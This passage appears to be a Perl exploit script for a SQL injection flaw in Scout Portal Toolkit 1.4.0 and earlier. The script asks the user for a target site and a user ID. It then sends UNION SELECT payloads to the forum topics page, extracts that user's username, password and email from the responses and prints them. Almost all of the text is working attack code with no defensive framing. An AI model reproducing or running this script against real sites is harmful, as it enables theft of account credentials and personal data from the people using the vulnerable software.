print &quot;\n===============================================================&quot;;
print &quot;\n=  Scout Portal Toolkit &lt;= 1.4.0 Remote SQL injection Exploit =&quot;;
print &quot;\n=             Discovred &amp; Coded By Simo64                     =&quot;;

print &quot;\n=           Moroccan Security Research Team                   =&quot;;
print &quot;\n===============================================================\n\n&quot;;

my($targ,$path,$userid,$xpl,$xpl2,$data,$data2,$email);

       print &quot;Enter Traget Exemple: http://site.com/ \nTraget : &quot;;
       chomp($targ = &lt;STDIN&gt;);
       print &quot;\n\nEnter Path TO Portal exemple:  /SPT/ OR just / \nPath : &quot;;

       chomp($path=&lt;STDIN&gt;);
       print &quot;\n\nEnter userid  Exemple: 1\nUserID :  &quot;;
       chomp($userid=&lt;STDIN&gt;);

$xpl1=&quot;-9+UNION+SELECT+null,UserName,UserPassword,null,null,null+FROM+APUsers+WHERE+UserId=&quot;;

$xpl2=&quot;-9+UNION+SELECT+null,Email,null,null,null,null+FROM+APUsers+WHERE+UserId=&quot;;
print &quot;\n[+] Connecting to: $targ\n&quot;;
$data = get($targ.$path.&quot;SPT--ForumTopics.php?forumid=&quot;.$xpl1.$userid) || die &quot;\n[+]Connexion Failed!\n&quot;;

$data2 = get($targ.$path.&quot;SPT--ForumTopics.php?forumid=&quot;.$xpl2.$userid) || die &quot;\n[+]Connexion Failed!\n&quot;;
print &quot;\n[+] Connected !\n&quot;;
print &quot;[+] Sending Data to $targ ....\n\n&quot;;


$username=substr($data,index($data,&quot;&lt;h1&gt;&quot;)+11,index($data,&quot;&lt;/h1&gt;&quot;)-12);
chomp $username;

$password=substr($data,index($data,&quot;&lt;/h1&gt;&quot;)+34,index($data,&quot;&lt;/p&gt;&quot;)-index($data,&quot;&lt;/h1&gt;&quot;)-34);

chomp $password;

$email=substr($data2,index($data,&quot;&lt;h1&gt;&quot;)+11,index($data2,&quot;&lt;/h1&gt;&quot;)-12);
chomp $email;

if(length($password) &lt;= 34){
print &quot;[!]Exploit Succeded !\n********************\n\n=========  UserID = $userid Infos =======&quot;;

print &quot;\n= UserID   : &quot;.$userid;
print &quot;\n= Username : &quot;.$username;
print &quot;\n= Password : &quot;.$password;
print &quot;\n= Email    : &quot;.$email;
print &quot;\n===================================\n\nEnjoy !&quot;;

}
else {print &quot;\n[!] Exploit Failed !&quot;;}